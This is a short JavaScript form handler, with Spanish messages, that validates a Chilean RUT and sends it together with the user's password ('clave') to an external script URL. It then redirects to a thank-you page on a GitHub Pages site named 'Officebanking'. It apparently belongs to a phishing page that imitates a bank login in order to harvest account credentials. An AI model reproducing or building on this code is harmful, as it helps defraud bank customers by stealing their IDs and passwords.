form.addEventListener("submit", async (e) => {
  e.preventDefault();
  mensaje.style.display = "none";
  cargando.style.display = "block";
  const boton = form.querySelector("button");
  boton.disabled = true;

  // Validar RUT
  const rut = form.rut.value.trim();
  if (!/^[\d\.]+-[\dkK]$/.test(rut)) {
    alert("RUT invÃ¡lido. Usa el formato 12.345.678-9.");
    cargando.style.display = "none";
    boton.disabled = false;
    return;
  }

  try {
    const response = await fetch("URL_ACTUALIZADO_DEL_SCRIPT", {
      method: "POST",
      body: JSON.stringify({
        rut: rut,
        clave: form.clave.value
      }),
      headers: { "Content-Type": "application/json" }
    });

    if (!response.ok) throw new Error("Error en la respuesta");
    
    mensaje.style.display = "block";
    setTimeout(() => {
      window.location.href = "https://oficinacurico.github.io/Officebanking/gracias";
    }, 3000);
  } catch (err) {
    console.error("Error:", err);
    alert("Error al enviar. Intenta nuevamente.");
  } finally {
    cargando.style.display = "none";
    boton.disabled = false;
  }
});
